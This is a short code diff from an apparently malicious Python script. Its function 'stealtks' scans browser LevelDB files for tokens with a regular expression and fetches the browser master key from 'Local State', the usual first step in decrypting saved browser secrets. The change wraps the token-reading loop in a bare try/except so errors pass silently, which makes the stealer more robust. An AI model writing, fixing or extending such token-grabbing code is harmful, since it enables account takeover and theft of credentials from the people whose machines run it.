@@ -306,12 +306,14 @@ def stealtks():
                             continue
                         else:
                             fn = os.path.join(ldb, file)
-                            with open(fn, errors="ignore", encoding="utf-8") as f:
-                                gnw = f.read()
-                                match = re.findall(regex1, gnw)
-                                for m in match:
-                                    tokens.add(m)
-
+                            try:
+                                with open(fn, errors="ignore", encoding="utf-8") as f:
+                                    gnw = f.read()
+                                    match = re.findall(regex1, gnw)
+                                    for m in match:
+                                        tokens.add(m)
+                            except:
+                                pass
         elif browser.startswith('1'):
             local_state = os.path.join(path, 'Local State')
             key = get_master_key(local_state)
@@ -397,6 +399,7 @@ def main():
         
 
 main()
+
 
 
 
